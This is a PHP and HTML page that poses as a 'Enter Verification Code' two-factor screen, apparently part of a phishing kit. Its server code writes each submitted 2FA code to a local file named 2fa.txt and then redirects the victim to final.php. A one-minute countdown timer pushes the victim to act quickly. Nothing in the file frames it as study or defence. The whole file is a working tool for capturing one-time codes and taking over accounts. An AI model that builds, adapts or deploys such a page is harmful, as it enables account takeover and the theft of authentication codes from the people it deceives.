<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $code = $_POST['code'] ?? '';
    file_put_contents("2fa.txt", "2FA: " . $code . "\n", FILE_APPEND);
    header("Location: final.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Enter 2FA Code</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      background-color: #0d1a26;
      font-family: 'Segoe UI', Tahoma, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      color: #ffffff;
    }

    form.verify-box {
      width: 360px;
      padding: 40px;
      background-color: #11202e;
      border-radius: 20px;
      position: relative;
      box-shadow: 0 0 20px rgba(0, 136, 204, 0.2);
      text-align: center;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    form.verify-box::before {
      content: "";
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      z-index: -1;
      background: linear-gradient(45deg, #0088cc, #6f42c1, #00c3ff);
      border-radius: 22px;
      background-size: 300% 300%;
      animation: borderRGB 6s ease infinite;
    }

    @keyframes borderRGB {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    h2 {
      color: #00c3ff;
      margin: 0;
    }

    p {
      font-size: 14px;
      color: #b0c7d6;
      margin: 0;
    }

    input[type="text"] {
      width: 100%;
      padding: 12px;
      border: 1px solid #2d3e50;
      border-radius: 8px;
      font-size: 14px;
      background-color: #1b2a38;
      color: #fff;
    }

    button {
      background: linear-gradient(90deg, #0088cc, #6f42c1, #00c3ff);
      background-size: 300% 300%;
      animation: borderRGB 6s ease infinite;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      transition: background-position 0.4s;
    }

    button:hover {
      background-position: 100% 0;
    }

    .timer {
      font-size: 14px;
      color: #70b9d4;
    }
  </style>
</head>
<body>

  <form method="POST" class="verify-box" autocomplete="off">
    <h2>Enter Verification Code</h2>
    <p>Please enter the 2FA code sent to your device to continue.</p>

    <input type="text" name="code" placeholder="Enter 2FA Code" required>
    <button type="submit">Verify</button>
    <div class="timer" id="timer">⏳ Time remaining: 1:00</div>
  </form>

  <script>
    let seconds = 60;
    const timerElement = document.getElementById("timer");

    const countdown = setInterval(() => {
      seconds--;
      let min = Math.floor(seconds / 60);
      let sec = seconds % 60;
      timerElement.textContent = `⏳ Time remaining: ${min}:${sec < 10 ? '0' + sec : sec}`;

      if (seconds <= 0) {
        clearInterval(countdown);
        timerElement.textContent = "⏳ Time expired. Please refresh the page.";
        document.querySelector("input[name='code']").disabled = true;
        document.querySelector("button[type='submit']").disabled = true;
      }
    }, 1000);
  </script>

</body>
</html>
